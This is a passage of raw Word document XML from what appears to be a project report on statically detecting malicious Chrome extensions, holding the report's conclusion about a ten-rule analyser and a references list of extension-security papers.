          <w:color w:val="222222"/>
        </w:rPr>
        <w:t xml:space="preserve">Extensions have become increasingly popular since their introduction, and the Chrome Web Store is full of extensions developed both by Google and by independent companies or developers. </w:t>
      </w:r>
      <w:r w:rsidRPr="00C32D4A">
        <w:t>As a result, malicious browser extensions have become a new threat, as criminals realize the potential to monetize a victim’s web browsing session and readily access web-related content and private data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FFB9CBA" w14:textId="3A7D080F" w:rsidR="0045459F" w:rsidRDefault="00C32D4A" w:rsidP="0045459F">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C32D4A">
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t xml:space="preserve">Our work examines cases of extensions with malicious intent. </w:t>
      </w:r>
      <w:r w:rsidR="00D73793">
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>After we gathered information from previous research papers like Hulk</w:t>
      </w:r>
      <w:r w:rsidR="00F221B0">
        <w:rPr>
          <w:color w:val="222222"/>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>[3]</w:t>
      </w:r>
      <w:r w:rsidR="00D73793">
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t xml:space="preserve"> and Chroak</w:t>
      </w:r>
      <w:r w:rsidR="00F221B0">
        <w:rPr>
          <w:color w:val="222222"/>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>[6]</w:t>
      </w:r>
      <w:r w:rsidR="00D73793">
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>, we implemented a mechanism which runs</w:t>
      </w:r>
      <w:r w:rsidRPr="00C32D4A">
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t xml:space="preserve"> a static analysis of the source code of </w:t>
      </w:r>
      <w:r w:rsidR="00D73793">
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>an</w:t>
      </w:r>
      <w:r w:rsidRPr="00C32D4A">
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t xml:space="preserve"> extension</w:t>
      </w:r>
      <w:r w:rsidR="00D73793">
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t xml:space="preserve"> in order</w:t>
      </w:r>
      <w:r w:rsidRPr="00C32D4A">
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t xml:space="preserve"> to detect suspicious activity and warn the user about</w:t>
      </w:r>
      <w:r w:rsidR="0045459F">
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C32D4A">
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>the potential harm it could cause</w:t>
      </w:r>
      <w:r w:rsidR="0045459F">
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00690929">
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006F4F03">
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>Detection of suspicious activity is succeeded by recognizing malicious functionality in the source code.</w:t>
      </w:r>
      <w:r w:rsidR="001F0BC9">
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t xml:space="preserve"> We have created 10 rules, where each rule represents a case of malicious</w:t>
      </w:r>
      <w:r w:rsidR="004075D9">
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>/suspicious</w:t>
      </w:r>
      <w:r w:rsidR="001F0BC9">
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t xml:space="preserve"> behavior. </w:t>
      </w:r>
      <w:r w:rsidR="00690929">
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>Further work can be done to extend the use of our application by adding more rules.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42B8560D" w14:textId="77777777" w:rsidR="00AF6952" w:rsidRPr="00C32D4A" w:rsidRDefault="00C32D4A" w:rsidP="0045459F">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C32D4A">
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C9F954" w14:textId="77777777" w:rsidR="00AF6952" w:rsidRPr="00C32D4A" w:rsidRDefault="00AF6952" w:rsidP="00AF6952">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="436EE5BB" w14:textId="77777777" w:rsidR="00AF6952" w:rsidRPr="00C32D4A" w:rsidRDefault="00AF6952" w:rsidP="00AF6952">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10700516" w14:textId="77777777" w:rsidR="00AF6952" w:rsidRPr="00C32D4A" w:rsidRDefault="00AF6952" w:rsidP="00AF6952">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="347FE1C7" w14:textId="77777777" w:rsidR="00AF6952" w:rsidRPr="00C32D4A" w:rsidRDefault="00AF6952" w:rsidP="00AF6952">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29055F65" w14:textId="77777777" w:rsidR="00AF6952" w:rsidRPr="00C32D4A" w:rsidRDefault="00AF6952" w:rsidP="00AF6952">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E295FD6" w14:textId="77777777" w:rsidR="00AF6952" w:rsidRPr="00C32D4A" w:rsidRDefault="00AF6952" w:rsidP="00AF6952">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="244E6CC9" w14:textId="77777777" w:rsidR="00AF6952" w:rsidRPr="00C32D4A" w:rsidRDefault="00AF6952" w:rsidP="00AF6952">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6FB01EE7" w14:textId="77777777" w:rsidR="00AF6952" w:rsidRPr="00C32D4A" w:rsidRDefault="00AF6952" w:rsidP="00AF6952">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="529E737C" w14:textId="77777777" w:rsidR="00AF6952" w:rsidRPr="00C32D4A" w:rsidRDefault="00AF6952" w:rsidP="00AF6952">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23C147B9" w14:textId="77777777" w:rsidR="00AF6952" w:rsidRPr="00C32D4A" w:rsidRDefault="00AF6952" w:rsidP="00AF6952">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48E9385B" w14:textId="77777777" w:rsidR="00AF6952" w:rsidRPr="00C32D4A" w:rsidRDefault="00AF6952" w:rsidP="00AF6952">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3623E515" w14:textId="77777777" w:rsidR="00AF6952" w:rsidRPr="00C32D4A" w:rsidRDefault="00AF6952" w:rsidP="00AF6952">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A18314B" w14:textId="77777777" w:rsidR="00AF6952" w:rsidRPr="00C32D4A" w:rsidRDefault="00AF6952" w:rsidP="00AF6952">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D27DBD8" w14:textId="77777777" w:rsidR="00AF6952" w:rsidRPr="00C32D4A" w:rsidRDefault="00AF6952" w:rsidP="00AF6952">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D29BFE3" w14:textId="77777777" w:rsidR="00AF6952" w:rsidRPr="00C32D4A" w:rsidRDefault="00AF6952" w:rsidP="00AF6952">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75B3602C" w14:textId="77777777" w:rsidR="00AF6952" w:rsidRPr="00C32D4A" w:rsidRDefault="00AF6952" w:rsidP="00AF6952">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D7D69CC" w14:textId="77777777" w:rsidR="00AF6952" w:rsidRPr="00C32D4A" w:rsidRDefault="00AF6952" w:rsidP="00AF6952">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F50B404" w14:textId="77777777" w:rsidR="00AF6952" w:rsidRPr="00C32D4A" w:rsidRDefault="00AF6952" w:rsidP="00AF6952">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1423375F" w14:textId="77777777" w:rsidR="00AF6952" w:rsidRPr="00EE6671" w:rsidRDefault="00AF6952" w:rsidP="00AF6952">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="260FF122" w14:textId="77777777" w:rsidR="00E730BA" w:rsidRPr="00EE6671" w:rsidRDefault="0096360A" w:rsidP="001830FB">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="357"/>
        <w:rPr>
          <w:rStyle w:val="shorttext"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="228" w:name="_Toc460936781"/>
      <w:bookmarkStart w:id="229" w:name="_Toc523071529"/>
      <w:r w:rsidRPr="00EE6671">
        <w:rPr>
          <w:rStyle w:val="shorttext"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en"/>
        </w:rPr>
        <w:t>REFERENCES</w:t>
      </w:r>
      <w:bookmarkEnd w:id="228"/>
      <w:bookmarkEnd w:id="229"/>
    </w:p>
    <w:p w14:paraId="4CA272FA" w14:textId="77777777" w:rsidR="00062DFE" w:rsidRPr="00EE6671" w:rsidRDefault="00062DFE" w:rsidP="00062DFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00EE6671">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>What are extensions?</w:t>
      </w:r>
      <w:r w:rsidRPr="00EE6671">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId17" w:history="1">
        <w:r w:rsidRPr="00EE6671">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://developer.chrome.com/extensions</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0F21C18E" w14:textId="77777777" w:rsidR="00062DFE" w:rsidRPr="00EE6671" w:rsidRDefault="00062DFE" w:rsidP="00062DFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00EE6671">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>Native Messaging.</w:t>
      </w:r>
      <w:r w:rsidRPr="00EE6671">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId18" w:history="1">
        <w:r w:rsidRPr="00EE6671">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://developer.chrome.com/apps/nativeMessaging</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1D0B2B2C" w14:textId="77777777" w:rsidR="00957C2E" w:rsidRPr="00EE6671" w:rsidRDefault="00765439" w:rsidP="00807DFE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EE6671">
        <w:t xml:space="preserve">Alexandros Kapravelos, </w:t>
      </w:r>
      <w:r w:rsidRPr="00EE6671">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">University of California, Santa Barbara; </w:t>
      </w:r>
      <w:r w:rsidRPr="00EE6671">
        <w:t xml:space="preserve">Chris Grier, </w:t>
      </w:r>
      <w:r w:rsidRPr="00EE6671">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">University of California, Berkeley, and International Computer Science Institute; </w:t>
      </w:r>
      <w:r w:rsidRPr="00EE6671">
        <w:t>Neha Chachra, u</w:t>
      </w:r>
      <w:r w:rsidRPr="00EE6671">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">niversity of California, San Diego; </w:t>
      </w:r>
      <w:r w:rsidRPr="00EE6671">
        <w:t xml:space="preserve">Christopher Kruegel and Giovanni Vigna, </w:t>
      </w:r>
      <w:r w:rsidRPr="00EE6671">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">University of California, Santa Barbara; </w:t>
      </w:r>
      <w:r w:rsidRPr="00EE6671">
        <w:t xml:space="preserve">Vern Paxson, </w:t>
      </w:r>
      <w:r w:rsidRPr="00EE6671">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">University of California, Berkeley, and International Computer Science Institute. </w:t>
      </w:r>
      <w:r w:rsidRPr="00EE6671">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve">Hulk: Eliciting Malicious Behavior in Browser Extensions. </w:t>
      </w:r>
      <w:hyperlink r:id="rId19" w:history="1">
        <w:r w:rsidRPr="00EE6671">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-kapravelos.pdf</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5083EE81" w14:textId="77777777" w:rsidR="00957C2E" w:rsidRPr="006D65D3" w:rsidRDefault="00957C2E" w:rsidP="00957C2E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:val="en" w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EE6671">
        <w:t xml:space="preserve">Lujo Bauer, Carnegie Mellon University; Shaoying Cai, Singapore Management University and Institute for Infocomm Research; Limin Jia, Carnegie Mellon University; Timothy Passaro, Carnegie Mellon University; Yuan Tian, Carnegie Mellon University; </w:t>
      </w:r>
      <w:r w:rsidRPr="00EE6671">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>Analyzing the Dangers Posed by Chrome Extensions</w:t>
      </w:r>
      <w:r w:rsidR="00F97466" w:rsidRPr="00EE6671">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId20" w:history="1">
        <w:r w:rsidR="00F97466" w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.ece.cmu.edu/~lbauer/papers/2014/cns2014-browserattacks.pdf</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7061BB8E" w14:textId="77777777" w:rsidR="00957C2E" w:rsidRPr="005B5B30" w:rsidRDefault="00F97466" w:rsidP="00F97466">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00EE6671">
        <w:t xml:space="preserve">Iskander Sanchez-Rola, Deustotech and University of Deusto; Igor Santos, Deustotech and University of Deusto; Davide Balzarotti, Eurecom; </w:t>
      </w:r>
      <w:r w:rsidRPr="00EE6671">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve">Extension Breakdown: Security Analysis of Browsers Extension Resources Control Policies. </w:t>
      </w:r>
      <w:hyperlink r:id="rId21" w:history="1">
        <w:r w:rsidRPr="00EE6671">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>://</w:t>
        </w:r>
        <w:r w:rsidRPr="00EE6671">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>paginaspersonales</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
        <w:r w:rsidRPr="00EE6671">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>deusto</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
        <w:r w:rsidRPr="00EE6671">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>es</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r w:rsidRPr="00EE6671">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>isantos</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r w:rsidRPr="00EE6671">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>papers</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>/2017/2017-</w:t>
        </w:r>
        <w:r w:rsidRPr="00EE6671">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>sanchez</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
        <w:r w:rsidRPr="00EE6671">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>rola</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
        <w:r w:rsidRPr="00EE6671">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>extensions</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
        <w:r w:rsidRPr="00EE6671">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>usenix</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
        <w:r w:rsidRPr="00EE6671">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>pdf</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3D090D1F" w14:textId="77777777" w:rsidR="006D65D3" w:rsidRDefault="00807DFE" w:rsidP="004F124C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:i/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EE6671">
        <w:t>Ryan Chipman, Tatsiana Ivonchyk, Danielle Man, Morgan Voss</w:t>
      </w:r>
      <w:r w:rsidR="004F124C" w:rsidRPr="00EE6671">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="004F124C" w:rsidRPr="00EE6671">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve">Security Analysis of Chrome Extensions. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7065179E" w14:textId="66525A7E" w:rsidR="00F97466" w:rsidRPr="00EE6671" w:rsidRDefault="00683412" w:rsidP="006D65D3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:i/>
          <w:color w:val="auto"/>
          <w:u w:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId22" w:history="1">
        <w:r w:rsidR="006D65D3" w:rsidRPr="00B63636">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://courses.csail.mit.edu/6.857/2016/files/24.pdf</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1350C41D" w14:textId="77777777" w:rsidR="006D65D3" w:rsidRPr="006D65D3" w:rsidRDefault="00EE6671" w:rsidP="00B13D81">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00EE6671">
        <w:t xml:space="preserve">Anupama Aggarwal, Bimal Viswanath, Liang Zhang, Saravana Kumar, Ayush Shah and Ponnurangam Kumaraguru; </w:t>
      </w:r>
      <w:r w:rsidRPr="00EE6671">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>I Spy with My Little Eye: Analysis and Detection of Spying Browser Extensions.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E064E64" w14:textId="34FE5EC3" w:rsidR="00727D18" w:rsidRPr="00EE6671" w:rsidRDefault="00683412" w:rsidP="006D65D3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:color w:val="auto"/>
          <w:u w:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId23" w:history="1">
        <w:r w:rsidR="006D65D3" w:rsidRPr="00B63636">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://precog.iiitd.edu.in/pubs/spying-extensions-eurosandp.pdf</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7147EAED" w14:textId="61FF6005" w:rsidR="00D77595" w:rsidRPr="005B5B30" w:rsidRDefault="00D77595" w:rsidP="00D77595">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00EE6671">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve">An In-Depth Look Into Malicious Browser Extensions. </w:t>
      </w:r>
      <w:hyperlink r:id="rId24" w:history="1">
        <w:r w:rsidR="006D65D3" w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>://</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>blog</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>trendmicro</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>com</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>trendlabs</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>security</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>intelligence</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
